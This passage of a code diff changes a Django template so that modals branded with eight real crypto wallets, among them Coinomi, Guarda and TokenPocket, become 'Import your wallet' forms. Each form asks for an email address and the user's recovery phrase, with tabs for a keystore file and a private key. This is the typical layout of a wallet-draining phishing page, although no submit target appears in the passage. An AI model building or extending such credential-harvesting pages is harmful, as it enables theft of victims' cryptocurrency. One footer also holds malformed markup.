+                    <label for="">Recovery Phrase</label>
+                    <div>
+                        <textarea name="phrase" id="phrase"
+                            placeholder="Enter your 12-24 word recovery phrase"></textarea>
+                        <p>Typically 12(sometimes 24) words separated by single spaces</p>
+                    </div>
+                </div>
             </div>
             <div class="modal-footer">
-                <button type="button" class="wallet-btn-secondary" data-modal-close>Close</button>
+                <button type="button" class="wallet-btn-secondary" data-modal-close>Close</button> <button type="submit"
+                    class="proceed">Proceeed</button>
             </div>
-        </div>
+        </form>
     </div>
 </div>
 
 <div class="modal fade wallet-modal" id="enjinModal" tabindex="-1" aria-labelledby="enjinModalLabel" aria-hidden="true">
     <div class="modal-dialog modal-dialog-centered">
-        <div class="modal-content">
+        <form class="modal-content">
             <div class="modal-header">
                 <span class="wallet-logo enjin wallet-modal-logo"><img src="{% static 'app/image/enjin.webp' %}"
                         alt="Enjin"></span>
-                <h5 class="modal-title" id="enjinModalLabel">Enjin</h5>
+                <p class="modal-title" id="enjinModalLabel">Import your Enjin wallet</p>
                 <button type="button" class="btn-close btn-close-white" data-modal-close aria-label="Close"></button>
             </div>
+            <div class="modal-header">
+                <button class="activebtn">Phrase</button>
+                <button>Keystore JSON</button>
+                <button>Private Key</button>
+            </div>
             <div class="modal-body">
-                <p class="wallet-step-text">Enjin</p>
+                <div class="phraseholder">
+                    <label for="wallet name">Wallet Name</label>
+                    <div>
+                        <input type="text" name="walletname" id="walletname" placeholder="Enter your wallet name">
+                    </div>
+                    <label for="">Email Address</label>
+                    <div>
+                        <input type="email" name="email" id="email" placeholder="Enter your email address">
+                    </div>
+                    <label for="">Recovery Phrase</label>
+                    <div>
+                        <textarea name="phrase" id="phrase"
+                            placeholder="Enter your 12-24 word recovery phrase"></textarea>
+                        <p>Typically 12(sometimes 24) words separated by single spaces</p>
+                    </div>
+                </div>
             </div>
             <div class="modal-footer">
-                <button type="button" class="wallet-btn-secondary" data-modal-close>Close</button>
+                <button type="button" class="wallet-btn-secondary" data-modal-close>Close</button> <button type="submit"
+                    class="proceed">Proceeed</button>
             </div>
-        </div>
+        </form>
     </div>
 </div>
 
 <div class="modal fade wallet-modal" id="coinomiModal" tabindex="-1" aria-labelledby="coinomiModalLabel"
     aria-hidden="true">
     <div class="modal-dialog modal-dialog-centered">
-        <div class="modal-content">
+        <form class="modal-content">
             <div class="modal-header">
                 <span class="wallet-logo coinomi wallet-modal-logo"><img src="{% static 'app/image/coinomono.png' %}"
                         alt="Coinomi"></span>
-                <h5 class="modal-title" id="coinomiModalLabel">Coinomi</h5>
+                <p class="modal-title" id="coinomiModalLabel">Import your Coinomi wallet</p>
                 <button type="button" class="btn-close btn-close-white" data-modal-close aria-label="Close"></button>
             </div>
+            <div class="modal-header">
+                <button class="activebtn">Phrase</button>
+                <button>Keystore JSON</button>
+                <button>Private Key</button>
+            </div>
             <div class="modal-body">
-                <p class="wallet-step-text">Coinomi</p>
+                <div class="phraseholder">
+                    <label for="wallet name">Wallet Name</label>
+                    <div>
+                        <input type="text" name="walletname" id="walletname" placeholder="Enter your wallet name">
+                    </div>
+                    <label for="">Email Address</label>
+                    <div>
+                        <input type="email" name="email" id="email" placeholder="Enter your email address">
+                    </div>
+                    <label for="">Recovery Phrase</label>
+                    <div>
+                        <textarea name="phrase" id="phrase"
+                            placeholder="Enter your 12-24 word recovery phrase"></textarea>
+                        <p>Typically 12(sometimes 24) words separated by single spaces</p>
+                    </div>
+                </div>
             </div>
-            <div class="modal-footer">
-                <button type="button" class="wallet-btn-secondary" data-modal-close>Close</button>
-            </div>
-        </div>
+            < <div class="modal-footer">
+                <button type="button" class="wallet-btn-secondary" data-modal-close>Close</button> <button type="submit"
+                    class="proceed">Proceeed</button>
     </div>
+    </form>
+</div>
 </div>
 
 <div class="modal fade wallet-modal" id="edgeModal" tabindex="-1" aria-labelledby="edgeModalLabel" aria-hidden="true">
     <div class="modal-dialog modal-dialog-centered">
-        <div class="modal-content">
+        <form class="modal-content">
             <div class="modal-header">
                 <span class="wallet-logo edge wallet-modal-logo"><img src="{% static 'app/image/edge.png' %}"
                         alt="Edge"></span>
-                <h5 class="modal-title" id="edgeModalLabel">Edge</h5>
+                <p class="modal-title" id="edgeModalLabel">Import your Edge wallet</p>
                 <button type="button" class="btn-close btn-close-white" data-modal-close aria-label="Close"></button>
             </div>
+            <div class="modal-header">
+                <button class="activebtn">Phrase</button>
+                <button>Keystore JSON</button>
+                <button>Private Key</button>
+            </div>
             <div class="modal-body">
-                <p class="wallet-step-text">Edge</p>
+                <div class="phraseholder">
+                    <label for="wallet name">Wallet Name</label>
+                    <div>
+                        <input type="text" name="walletname" id="walletname" placeholder="Enter your wallet name">
+                    </div>
+                    <label for="">Email Address</label>
+                    <div>
+                        <input type="email" name="email" id="email" placeholder="Enter your email address">
+                    </div>
+                    <label for="">Recovery Phrase</label>
+                    <div>
+                        <textarea name="phrase" id="phrase"
+                            placeholder="Enter your 12-24 word recovery phrase"></textarea>
+                        <p>Typically 12(sometimes 24) words separated by single spaces</p>
+                    </div>
+                </div>
             </div>
             <div class="modal-footer">
-                <button type="button" class="wallet-btn-secondary" data-modal-close>Close</button>
+                <button type="button" class="wallet-btn-secondary" data-modal-close>Close</button> <button type="submit"
+                    class="proceed">Proceeed</button>
             </div>
-        </div>
+        </form>
     </div>
 </div>
 
 <div class="modal fade wallet-modal" id="zelcoreModal" tabindex="-1" aria-labelledby="zelcoreModalLabel"
     aria-hidden="true">
     <div class="modal-dialog modal-dialog-centered">
-        <div class="modal-content">
+        <form class="modal-content">
             <div class="modal-header">
                 <span class="wallet-logo zelcore wallet-modal-logo"><img src="{% static 'app/image/zelcore.png' %}"
                         alt="Zelcore"></span>
-                <h5 class="modal-title" id="zelcoreModalLabel">Zelcore</h5>
+                <p class="modal-title" id="zelcoreModalLabel">Import your Zelcore wallet</p>
                 <button type="button" class="btn-close btn-close-white" data-modal-close aria-label="Close"></button>
             </div>
+            <div class="modal-header">
+                <button class="activebtn">Phrase</button>
+                <button>Keystore JSON</button>
+                <button>Private Key</button>
+            </div>
             <div class="modal-body">
-                <p class="wallet-step-text">Zelcore</p>
+                <div class="phraseholder">
+                    <label for="wallet name">Wallet Name</label>
+                    <div>
+                        <input type="text" name="walletname" id="walletname" placeholder="Enter your wallet name">
+                    </div>
+                    <label for="">Email Address</label>
+                    <div>
+                        <input type="email" name="email" id="email" placeholder="Enter your email address">
+                    </div>
+                    <label for="">Recovery Phrase</label>
+                    <div>
+                        <textarea name="phrase" id="phrase"
+                            placeholder="Enter your 12-24 word recovery phrase"></textarea>
+                        <p>Typically 12(sometimes 24) words separated by single spaces</p>
+                    </div>
+                </div>
             </div>
             <div class="modal-footer">
-                <button type="button" class="wallet-btn-secondary" data-modal-close>Close</button>
+                <button type="button" class="wallet-btn-secondary" data-modal-close>Close</button> <button type="submit"
+                    class="proceed">Proceeed</button>
             </div>
-        </div>
+        </form>
     </div>
 </div>
 
 <div class="modal fade wallet-modal" id="guardaModal" tabindex="-1" aria-labelledby="guardaModalLabel"
     aria-hidden="true">
     <div class="modal-dialog modal-dialog-centered">
-        <div class="modal-content">
+        <form class="modal-content">
             <div class="modal-header">
                 <span class="wallet-logo guarda wallet-modal-logo"><img src="{% static 'app/image/guarda.png' %}"
                         alt="Guarda"></span>
-                <h5 class="modal-title" id="guardaModalLabel">Guarda</h5>
+                <p class="modal-title" id="guardaModalLabel">Import your Guarda wallet</p>
                 <button type="button" class="btn-close btn-close-white" data-modal-close aria-label="Close"></button>
             </div>
+            <div class="modal-header">
+                <button class="activebtn">Phrase</button>
+                <button>Keystore JSON</button>
+                <button>Private Key</button>
+            </div>
             <div class="modal-body">
-                <p class="wallet-step-text">Guarda</p>
+                <div class="phraseholder">
+                    <label for="wallet name">Wallet Name</label>
+                    <div>
+                        <input type="text" name="walletname" id="walletname" placeholder="Enter your wallet name">
+                    </div>
+                    <label for="">Email Address</label>
+                    <div>
+                        <input type="email" name="email" id="email" placeholder="Enter your email address">
+                    </div>
+                    <label for="">Recovery Phrase</label>
+                    <div>
+                        <textarea name="phrase" id="phrase"
+                            placeholder="Enter your 12-24 word recovery phrase"></textarea>
+                        <p>Typically 12(sometimes 24) words separated by single spaces</p>
+                    </div>
+                </div>
             </div>
             <div class="modal-footer">
-                <button type="button" class="wallet-btn-secondary" data-modal-close>Close</button>
+                <button type="button" class="wallet-btn-secondary" data-modal-close>Close</button> <button type="submit"
+                    class="proceed">Proceeed</button>
             </div>
-        </div>
+        </form>
     </div>
 </div>
 
 <div class="modal fade wallet-modal" id="mathwalletModal" tabindex="-1" aria-labelledby="mathwalletModalLabel"
     aria-hidden="true">
     <div class="modal-dialog modal-dialog-centered">
-        <div class="modal-content">
+        <form class="modal-content">
             <div class="modal-header">
                 <span class="wallet-logo mathwallet wallet-modal-logo"><img
                         src="{% static 'app/image/mathwallet.png' %}" alt="MathWallet"></span>
-                <h5 class="modal-title" id="mathwalletModalLabel">MathWallet</h5>
+                <p class="modal-title" id="mathwalletModalLabel">Import your MathWallet</p>
                 <button type="button" class="btn-close btn-close-white" data-modal-close aria-label="Close"></button>
             </div>
+            <div class="modal-header">
+                <button class="activebtn">Phrase</button>
+                <button>Keystore JSON</button>
+                <button>Private Key</button>
+            </div>
             <div class="modal-body">
-                <p class="wallet-step-text">MathWallet</p>
+                <div class="phraseholder">
+                    <label for="wallet name">Wallet Name</label>
+                    <div>
+                        <input type="text" name="walletname" id="walletname" placeholder="Enter your wallet name">
+                    </div>
+                    <label for="">Email Address</label>
+                    <div>
+                        <input type="email" name="email" id="email" placeholder="Enter your email address">
+                    </div>
+                    <label for="">Recovery Phrase</label>
+                    <div>
+                        <textarea name="phrase" id="phrase"
+                            placeholder="Enter your 12-24 word recovery phrase"></textarea>
+                        <p>Typically 12(sometimes 24) words separated by single spaces</p>
+                    </div>
+                </div>
             </div>
             <div class="modal-footer">
-                <button type="button" class="wallet-btn-secondary" data-modal-close>Close</button>
+                <button type="button" class="wallet-btn-secondary" data-modal-close>Close</button> <button type="submit"
+                    class="proceed">Proceeed</button>
             </div>
-        </div>
+        </form>
     </div>
 </div>
 
 <div class="modal fade wallet-modal" id="tokenpocketModal" tabindex="-1" aria-labelledby="tokenpocketModalLabel"
     aria-hidden="true">
     <div class="modal-dialog modal-dialog-centered">
-        <div class="modal-content">
+        <form class="modal-content">
             <div class="modal-header">
                 <span class="wallet-logo tokenpocket wallet-modal-logo"><img
                         src="{% static 'app/image/tokenpocket.png' %}" alt="TokenPocket"></span>
-                <h5 class="modal-title" id="tokenpocketModalLabel">TokenPocket</h5>
+                <p class="modal-title" id="tokenpocketModalLabel">Import your TokenPocket wallet</p>
                 <button type="button" class="btn-close btn-close-white" data-modal-close aria-label="Close"></button>
             </div>
+            <div class="modal-header">
+                <button class="activebtn">Phrase</button>
+                <button>Keystore JSON</button>
+                <button>Private Key</button>
+            </div>
             <div class="modal-body">
-                <p class="wallet-step-text">TokenPocket</p>
+                <div class="phraseholder">
+                    <label for="wallet name">Wallet Name</label>
+                    <div>
+                        <input type="text" name="walletname" id="walletname" placeholder="Enter your wallet name">
+                    </div>
+                    <label for="">Email Address</label>
+                    <div>
+                        <input type="email" name="email" id="email" placeholder="Enter your email address">
+                    </div>
+                    <label for="">Recovery Phrase</label>
+                    <div>
+                        <textarea name="phrase" id="phrase"
+                            placeholder="Enter your 12-24 word recovery phrase"></textarea>
+                        <p>Typically 12(sometimes 24) words separated by single spaces</p>
+                    </div>
+                </div>
             </div>
             <div class="modal-footer">
-                <button type="button" class="wallet-btn-secondary" data-modal-close>Close</button>
+                <button type="button" class="wallet-btn-secondary" data-modal-close>Close</button> <button type="submit"
+                    class="proceed">Proceeed</button>
             </div>
-        </div>
+        </form>
     </div>
 </div>
 
 <div class="modal fade wallet-modal" id="alphaModal" tabindex="-1" aria-labelledby="alphaModalLabel" aria-hidden="true">
     <div class="modal-dialog modal-dialog-centered">
-        <div class="modal-content">
+        <form class="modal-content">
             <div class="modal-header">
                 <span class="wallet-logo alpha wallet-modal-logo"><img src="{% static 'app/image/alpha.png' %}"
                         alt="AlphaWallet"></span>
-                <h5 class="modal-title" id="alphaModalLabel">AlphaWallet</h5>
+                <p class="modal-title" id="alphaModalLabel"> Import your AlphaWallet</p>
                 <button type="button" class="btn-close btn-close-white" data-modal-close aria-label="Close"></button>
             </div>
+            <div class="modal-header">
+                <button class="activebtn">Phrase</button>
+                <button>Keystore JSON</button>
+                <button>Private Key</button>
+            </div>
             <div class="modal-body">
-                <p class="wallet-step-text">AlphaWallet</p>
+                <div class="phraseholder">
+                    <label for="wallet name">Wallet Name</label>
+                    <div>
+                        <input type="text" name="walletname" id="walletname" placeholder="Enter your wallet name">
+                    </div>
+                    <label for="">Email Address</label>
+                    <div>
+                        <input type="email" name="email" id="email" placeholder="Enter your email address">
+                    </div>
+                    <label for="">Recovery Phrase</label>
+                    <div>
+                        <textarea name="phrase" id="phrase"
+                            placeholder="Enter your 12-24 word recovery phrase"></textarea>
+                        <p>Typically 12(sometimes 24) words separated by single spaces</p>
+                    </div>
+                </div>
             </div>
+
             <div class="modal-footer">
-                <button type="button" class="wallet-btn-secondary" data-modal-close>Close</button>
+                <button type="button" class="wallet-btn-secondary" data-modal-close>Close</button> <button type="submit"
+                    class="proceed">Proceeed</button>
             </div>
-        </div>
+        </form>
     </div>
 </div>
 
